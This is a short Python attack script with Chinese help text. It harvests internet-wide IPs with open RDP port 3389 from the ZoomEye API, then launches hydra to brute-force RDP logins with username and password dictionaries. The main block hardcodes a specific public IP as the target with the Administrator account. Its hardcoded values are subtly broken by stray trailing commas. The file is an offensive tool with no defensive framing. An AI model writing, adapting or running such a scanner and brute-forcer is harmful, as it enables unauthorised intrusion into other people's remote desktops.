# -*-coding:utf-8-*-
import optparse
import os
import requests
import time
def main():
    usage='[help -s  扫描全网3389]'
    parser=optparse.OptionParser(usage)
    parser.add_option('-s',action='store_true',dest='ji',help='扫描全网3389')
    parser.add_option('-b',dest='bao',help='爆破字典（username）')
    parser.add_option('-p',dest='passs',help='爆破字典(password)')
    parser.add_option('-x',dest='host',help='目标')
    (options,args)=parser.parse_args()
    if options.ji:
        Ji()
    elif options.bao and options.host and options.passs:
        bao=options.bao
        ip=options.host
        passs=options.passs
        Bao(bao,ip,passs)
    else:
        parser.print_help()
        exit()
def Ji():
    for r in range(1,10):
        time.sleep(1)
        g='https://api.zoomeye.org/host/search?query=port:3389&page={}'.format(r)
        headers={"Authorization":"JWT token"}
        r=requests.get(g,headers=headers)
        sd=r.json()
        rsd=sd['matches'][0:]
        for l in rsd:
            print(l['ip'])
            owe=l['ip']
            with open('3389.txt','a') as p:
                p.write(owe+'\n')
def Bao(bao,ip,passs):
    baopo=os.system('hydra.exe -L {} -P {} rdp://{}'.format(bao,passs,ip))

if __name__ == '__main__':
    bao = 'Administrator',
    passs = 'pass_dict.txt',
    ip = '150.109.64.81',
    res = Bao(bao,ip,passs)
    print(res)